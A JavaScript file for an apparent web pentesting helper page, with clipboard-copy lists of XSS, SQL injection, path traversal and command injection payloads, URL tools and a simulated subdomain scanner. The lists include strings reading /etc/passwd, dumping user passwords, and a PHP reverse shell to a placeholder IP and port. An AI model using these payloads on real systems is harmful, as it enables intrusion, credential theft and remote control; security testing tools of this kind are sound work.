document.addEventListener('DOMContentLoaded', function() {
    // Tab functionality
    const tabs = document.querySelectorAll('.payload-tab');
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            // Remove active class from all tabs and content
            document.querySelectorAll('.payload-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.payload-content').forEach(c => c.classList.remove('active'));
            
            // Add active class to clicked tab
            tab.classList.add('active');
            
            // Show corresponding content
            const tabName = tab.getAttribute('data-tab');
            document.getElementById(`${tabName}-payloads`).classList.add('active');
            
            // Load payloads if not already loaded
            if (document.getElementById(`${tabName}-payloads`).innerHTML === '') {
                loadPayloads(tabName);
            }
        });
    });

    // Load initial payloads (XSS)
    loadPayloads('xss');

    // URL manipulation
    document.getElementById('encode-url').addEventListener('click', encodeURL);
    document.getElementById('decode-url').addEventListener('click', decodeURL);
    document.getElementById('add-param').addEventListener('click', addParam);
    document.getElementById('send-request').addEventListener('click', sendRequest);

    // Subdomain enumeration
    document.getElementById('scan-subdomains').addEventListener('click', scanSubdomains);

    // Request interceptor
    document.getElementById('send-request').addEventListener('click', sendCustomRequest);

    function loadPayloads(type) {
        const payloads = {
            xss: [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '" onmouseover="alert(1)',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">'
            ],
            sqli: [
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin' --",
                "1' ORDER BY 1--",
                "1' UNION SELECT null,username,password FROM users--",
                "1' AND (SELECT * FROM users) = 1--"
            ],
            lfi: [
                "../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "%00../../../../etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "file:///etc/passwd"
            ],
            rce: [
                ";ls -la",
                "|id",
                "`id`",
                "$(id)",
                "|| id",
                "&& id",
                ";php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ]
        };

        const container = document.getElementById(`${type}-payloads`);
        container.innerHTML = '';
        
        payloads[type].forEach(payload => {
            const payloadElement = document.createElement('div');
            payloadElement.className = 'payload-item';
            payloadElement.textContent = payload;
            payloadElement.addEventListener('click', () => {
                navigator.clipboard.writeText(payload);
                alert('Payload copied to clipboard!');
            });
            container.appendChild(payloadElement);
        });
    }

    function encodeURL() {
        const urlInput = document.getElementById('target-url');
        urlInput.value = encodeURIComponent(urlInput.value);
    }

    function decodeURL() {
        const urlInput = document.getElementById('target-url');
        urlInput.value = decodeURIComponent(urlInput.value);
    }

    function addParam() {
        const urlInput = document.getElementById('target-url');
        const paramName = prompt('Enter parameter name:');
        if (paramName) {
            const paramValue = prompt('Enter parameter value:');
            const separator = urlInput.value.includes('?') ? '&' : '?';
            urlInput.value += `${separator}${paramName}=${paramValue || ''}`;
        }
    }

    function sendRequest() {
        const url = document.getElementById('target-url').value;
        if (!url) return alert('Please enter a URL');
        
        try {
            document.getElementById('result-frame').src = url;
        } catch (e) {
            alert('Error loading URL: ' + e.message);
        }
    }

    async function scanSubdomains() {
        const domain = document.getElementById('domain-input').value;
        if (!domain) return alert('Please enter a domain');
        
        const resultsContainer = document.getElementById('subdomain-results');
        resultsContainer.innerHTML = '<div class="subdomain-item">Scanning... This is a simulation for demo purposes</div>';
        
        // Simulate scanning with common subdomains
        setTimeout(() => {
            resultsContainer.innerHTML = '';
            const commonSubdomains = [
                'www', 'mail', 'ftp', 'admin', 'webmail', 
                'server', 'ns1', 'ns2', 'test', 'dev'
            ];
            
            commonSubdomains.forEach(sub => {
                const item = document.createElement('div');
                item.className = 'subdomain-item';
                item.innerHTML = `
                    <span>${sub}.${domain}</span>
                    <button class="test-subdomain">Test</button>
                `;
                item.querySelector('.test-subdomain').addEventListener('click', () => {
                    document.getElementById('target-url').value = `https://${sub}.${domain}`;
                });
                resultsContainer.appendChild(item);
            });
        }, 1500);
    }

    async function sendCustomRequest() {
        // This would need to be implemented with a backend proxy due to CORS
        alert('In a real implementation, this would send the custom request through a proxy');
    }
});